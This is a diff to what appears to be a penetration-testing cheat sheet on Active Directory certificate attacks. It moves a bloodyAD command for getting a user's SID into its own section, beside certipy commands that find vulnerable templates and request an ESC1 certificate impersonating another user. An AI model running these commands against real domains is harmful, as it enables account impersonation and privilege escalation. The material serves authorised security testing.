@@ -877,15 +877,20 @@ u.objectid ENDS WITH "-548" RETURN q
   ```shell
   certipy find -u <AD_user> -p <password> -dc-ip <Domain_Controller_IP> -vulnerable -stdout -enabled -text -json
   ```
+</details>
+
+<details>
+  <summary> BloodyAD get user SID </summary> 
+
+  ### 
+  ```shell
+  bloodyAD -u <AD_user> -d <domain> -p <password> --host <Domain_Controller_IP> get object <AD_user>
+  ```
 </details> 
 
 <details>
   <summary> ESC1 </summary> 
 
-  ### Get user SID
-  ```shell
-  bloodyAD -u <AD_user> -d <domain> -p <password> --host <Domain_Controller_IP> get object <AD_user>
-  ```
   ### Request cert
   ```shell
   certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
